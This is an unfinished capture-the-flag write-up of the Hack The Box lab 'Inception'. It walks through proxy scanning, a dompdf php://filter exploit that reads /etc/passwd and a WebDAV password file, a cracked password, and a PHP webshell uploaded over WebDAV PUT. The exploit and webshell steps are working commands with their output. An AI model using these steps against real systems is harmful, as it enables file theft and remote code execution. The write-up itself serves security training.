---
title: "[HTB] Machine: Inception"
description: "[HTB] Machine: Inception"
date: 2023-10-17
menu:
  sidebar:
    name: "[HTB] Machine: Inception"
    identifier: htb-machine-Inception
    parent: htb-machines-linux
    weight: 10
hero: images/inception.png
tags: ["HTB"]
---

# Inception
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.10.67
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 19:11 BST
Stats: 0:05:40 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 81.05% done; ETC: 19:18 (0:01:20 remaining)
Nmap scan report for 10.10.10.67 (10.10.10.67)
Host is up (0.10s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3128/tcp open  squid-http

Nmap done: 1 IP address (1 host up) scanned in 416.34 seconds
```
```
└─$ nmap -Pn -p80,3128 -sC -sV 10.10.10.67
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 19:19 BST
Nmap scan report for 10.10.10.67 (10.10.10.67)
Host is up (0.11s latency).

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inception
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.26 seconds

```

- Web server

![](./images/1.png)

- `feroxbuster`
```
└─$ feroxbuster -u http://10.10.10.67 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php --depth 2   

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.67
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 2
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      311c http://10.10.10.67/images => http://10.10.10.67/images/
200      GET        8l       71w     2380c http://10.10.10.67/assets/js/ie/html5shiv.js
200      GET      174l      401w     5284c http://10.10.10.67/assets/js/main.js
200      GET     1187l     2417w    22010c http://10.10.10.67/assets/css/main.css
200      GET       12l       34w      228c http://10.10.10.67/assets/css/ie9.css
200      GET       27l       54w      422c http://10.10.10.67/assets/css/ie8.css
200      GET     1051l      169w     2877c http://10.10.10.67/
200      GET      397l     4810w   190069c http://10.10.10.67/images/bg03.jpg
301      GET        9l       28w      311c http://10.10.10.67/assets => http://10.10.10.67/assets/
200      GET       69l      328w     2307c http://10.10.10.67/README.txt
200      GET       63l     2733w    17128c http://10.10.10.67/LICENSE.txt

```

## Foothold
- We saw a `squid` proxy
  - Let's configure `proxychains`
  - Add `http 10.10.10.67 3128` to `/etc/proxychains4.conf`
  - Now we can `nmap`

```
└─$ proxychains nmap -Pn -sC -sV 127.0.0.1 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-22 17:06 BST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 2.20% done; ETC: 17:11 (0:04:27 remaining)
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 2.60% done; ETC: 17:11 (0:04:22 remaining)
Stats: 0:03:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 67.70% done; ETC: 17:11 (0:01:41 remaining)
Nmap scan report for localhost (127.0.0.1)
Host is up (0.30s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 93:ad:d8:31:eb:db:c3:30:8e:96:c4:60:82:8b:4f:c4 (RSA)
|   256 1e:a8:07:32:25:c2:f9:a7:65:98:0e:52:15:3d:96:f7 (ECDSA)
|_  256 37:1d:45:db:f6:b1:2a:92:50:13:69:de:77:a4:ef:ae (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Inception
|_http-server-header: Apache/2.4.18 (Ubuntu)
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 374.76 seconds
```
```
└─$ proxychains ssh root@localhost
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
root@localhost's password:
```
- We could also use `wfuzz` to perform a scan using `squid` as proxy
```
└─$  wfuzz -u http://127.0.0.1:FUZZ -z range,1-65535 -p 10.10.10.67:3128:HTTP --hw 399
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://127.0.0.1:FUZZ/
Total requests: 65535

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000022:   200        2 L      4 W        60 Ch       "22"
000000080:   200        1051 L   169 W      2877 Ch     "80"
000003128:   400        151 L    416 W      3521 Ch     "3128" 
```

- We saw a comment on port `80` about `dompdf`

![](./images/2.png)

- If we visit `/dompdf`, we have a hit and the  `version` is `0.6.0`

![](./images/3.png)

- We have a [exploit](https://www.exploit-db.com/exploits/33004)
```
└─$ curl -s 'http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd'
%PDF-1.3
1 0 obj
<< /Type /Catalog
...
BT 34.016 734.579 Td /F1 12.0 Tf  [(cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwMzpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDU6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzbG9nOng6MTA0OjEwODo6L2hvbWUvc3lzbG9nOi9iaW4vZmFsc2UKX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKc3NoZDp4OjEwNjo2NTUzNDo6L3Zhci9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpjb2JiOng6MTAwMDoxMDAwOjovaG9tZS9jb2JiOi9iaW4vYmFzaAo=)] TJ ET
endstream
...
```
```
└─$ echo "cm9vd..." | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
cobb:x:1000:1000::/home/cobb:/bin/bash
```

- Let's enumerate
  - Can't read anything in `cobb`'s home directory
  - We can check `apache`'s config file for additional `vhosts`
  - Also `squid.conf`
    - `/etc/squid/squid.conf`
    - But nothing there
```
└─$ curl -s 'http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/apache2/sites-enabled/000-default.conf'
...
PFZpcnR1YWxIb3N0ICo6ODA+CgkjIFRoZSBTZXJ2ZXJOYW1lIGRpcmVjdGl2ZSBzZXRzIHRoZSByZXF1ZXN0IHNjaGVtZSwgaG9zdG5hbWUgYW5kIHBvcnQgdGhhdAoJIyB0aGUgc2VydmVyIHVzZXMgdG8gaWRlbnRpZnkgaXRzZWxmLiBUaGlzIGlzIHVzZWQgd2hlbiBjcmVhdGluZwoJIyByZWRpcmVjdGlvbiBVUkxzLiBJbiB0aGUgY29udGV4dCBvZiB2aXJ0dWFsIGhvc3RzLCB0aGUgU2VydmVyTmFtZQoJIyBzcGVjaWZpZXMgd2hhdCBob3N0bmFtZSBtdXN0IGFwcGVhciBpbiB0aGUgcmVxdWVzdCdzIEhvc3Q6IGhlYWRlciB0bwoJIyBtYXRjaCB0aGlzIHZpcnR1YWwgaG9zdC4gRm9yIHRoZSBkZWZhdWx0IHZpcnR1YWwgaG9zdCAodGhpcyBmaWxlKSB0aGlzCgkjIHZhbHVlIGlzIG5vdCBkZWNpc2l2ZSBhcyBpdCBpcyB1c2VkIGFzIGEgbGFzdCByZXNvcnQgaG9zdCByZWdhcmRsZXNzLgoJIyBIb3dldmVyLCB5b3UgbXVzdCBzZXQgaXQgZm9yIGFueSBmdXJ0aGVyIHZpcnR1YWwgaG9zdCBleHBsaWNpdGx5LgoJI1NlcnZlck5hbWUgd3d3LmV4YW1wbGUuY29tCgoJU2VydmVyQWRtaW4gd2VibWFzdGVyQGxvY2FsaG9zdAoJRG9jdW1lbnRSb290IC92YXIvd3d3L2h0bWwKCgkjIEF2YWlsYWJsZSBsb2dsZXZlbHM6IHRyYWNlOCwgLi4uLCB0cmFjZTEsIGRlYnVnLCBpbmZvLCBub3RpY2UsIHdhcm4sCgkjIGVycm9yLCBjcml0LCBhbGVydCwgZW1lcmcuCgkjIEl0IGlzIGFsc28gcG9zc2libGUgdG8gY29uZmlndXJlIHRoZSBsb2dsZXZlbCBmb3IgcGFydGljdWxhcgoJIyBtb2R1bGVzLCBlLmcuCgkjTG9nTGV2ZWwgaW5mbyBzc2w6d2FybgoKCUVycm9yTG9nICR7QVBBQ0hFX0xPR19ESVJ9L2Vycm9yLmxvZwoJQ3VzdG9tTG9nICR7QVBBQ0hFX0xPR19ESVJ9L2FjY2Vzcy5sb2cgY29tYmluZWQKCgkjIEZvciBtb3N0IGNvbmZpZ3VyYXRpb24gZmlsZXMgZnJvbSBjb25mLWF2YWlsYWJsZS8sIHdoaWNoIGFyZQoJIyBlbmFibGVkIG9yIGRpc2FibGVkIGF0IGEgZ2xvYmFsIGxldmVsLCBpdCBpcyBwb3NzaWJsZSB0bwoJIyBpbmNsdWRlIGEgbGluZSBmb3Igb25seSBvbmUgcGFydGljdWxhciB2aXJ0dWFsIGhvc3QuIEZvciBleGFtcGxlIHRoZQoJIyBmb2xsb3dpbmcgbGluZSBlbmFibGVzIHRoZSBDR0kgY29uZmlndXJhdGlvbiBmb3IgdGhpcyBob3N0IG9ubHkKCSMgYWZ0ZXIgaXQgaGFzIGJlZW4gZ2xvYmFsbHkgZGlzYWJsZWQgd2l0aCAiYTJkaXNjb25mIi4KCSNJbmNsdWRlIGNvbmYtYXZhaWxhYmxlL3NlcnZlLWNnaS1iaW4uY29uZgoJQWxpYXMgL3dlYmRhdl90ZXN0X2luY2VwdGlvbiAvdmFyL3d3dy9odG1sL3dlYmRhdl90ZXN0X2luY2VwdGlvbgoJPExvY2F0aW9uIC93ZWJkYXZfdGVzdF9pbmNlcHRpb24+CgkJT3B0aW9ucyBGb2xsb3dTeW1MaW5rcwoJCURBViBPbgoJCUF1dGhUeXBlIEJhc2ljCgkJQXV0aE5hbWUgIndlYmRhdiB0ZXN0IGNyZWRlbnRpYWwiCgkJQXV0aFVzZXJGaWxlIC92YXIvd3d3L2h0bWwvd2ViZGF2X3Rlc3RfaW5jZXB0aW9uL3dlYmRhdi5wYXNzd2QKCQlSZXF1aXJlIHZhbGlkLXVzZXIKCTwvTG9jYXRpb24+CjwvVmlydHVhbEhvc3Q+CgojIHZpbTogc3ludGF4PWFwYWNoZSB0cz00IHN3PTQgc3RzPTQgc3Igbm9ldAo=
...
```
```
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
        Alias /webdav_test_inception /var/www/html/webdav_test_inception
        <Location /webdav_test_inception>
                Options FollowSymLinks
                DAV On
                AuthType Basic
                AuthName "webdav test credential"
                AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd
                Require valid-user
        </Location>
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

- Let's retrieve `/var/www/html/webdav_test_inception/webdav.passwd`
```
└─$ curl -s 'http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/webdav_test_inception/webdav.passwd'
```
```
└─$ echo "d2ViZGF2X3Rlc3RlcjokYXByMSQ4ck83U21pNCR5cW43SC5HdkpGdHNUb3UxYTdWTUUwCg==" | base64 -d
webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
```

- Crack it
```
└─$ hashcat --user hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
...
$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0:babygurl69          
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
Time.Started.....: Sun Oct 22 17:21:01 2023 (4 secs)
Time.Estimated...: Sun Oct 22 17:21:05 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     6883 H/s (9.01ms) @ Accel:32 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 22464/14344385 (0.16%)
Rejected.........: 0/22464 (0.00%)
Restore.Point....: 22400/14344385 (0.16%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidate.Engine.: Device Generator
Candidates.#1....: boneka -> 171091
Hardware.Mon.#1..: Util: 99%

Started: Sun Oct 22 17:20:47 2023
Stopped: Sun Oct 22 17:21:06 2023
```

- We have [WebDav](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav)
  - We could try `davtest`
```
└─$ davtest -url http://10.10.10.67/webdav_test_inception -auth webdav_tester:babygurl69    
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.67/webdav_test_inception
********************************************************
NOTE    Random string for this session: KYt_YHBtL4
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4
********************************************************
 Sending test files
PUT     txt     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.txt
PUT     cfm     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.cfm
PUT     asp     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.asp
PUT     jsp     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.jsp
PUT     php     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.php
PUT     cgi     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.cgi
PUT     aspx    SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.aspx
PUT     jhtml   SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.jhtml
PUT     shtml   SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.shtml
PUT     pl      SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.pl
PUT     html    SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.html
********************************************************
 Checking for test file execution
EXEC    txt     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.txt
EXEC    txt     FAIL
EXEC    cfm     FAIL
EXEC    asp     FAIL
EXEC    jsp     FAIL
EXEC    php     SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.php
EXEC    php     FAIL
EXEC    cgi     FAIL
EXEC    aspx    FAIL
EXEC    jhtml   FAIL
EXEC    shtml   FAIL
EXEC    pl      FAIL
EXEC    html    SUCCEED:        http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.html
EXEC    html    FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.txt
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.cfm
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.asp
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.jsp
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.php
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.cgi
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.aspx
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.jhtml
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.shtml
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.pl
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.html
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.txt
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.php
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.html
```

- Let's create a webshell
```
└─$ curl -X PUT http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/shell.php -d @shell.php 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav_test_inception/shell.php has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.67 Port 80</address>
</body></html>
                            
```

- Test it
```
└─$ curl --data-urlencode 'cmd=id' http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/shell.php    
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- But if try to ping, I have nothing
```
└─$ curl --data-urlencode 'cmd=ping -c 1 10.10.16.9' http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/shell.php 
PING 10.10.16.9 (10.10.16.9) 56(84) bytes of data.

--- 10.10.16.9 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms

```

- It could be firewall
  - We could create a `forward shell` based on this [video](https://www.youtube.com/watch?v=-ST2FSbqEcU)
```

```
## User



## Root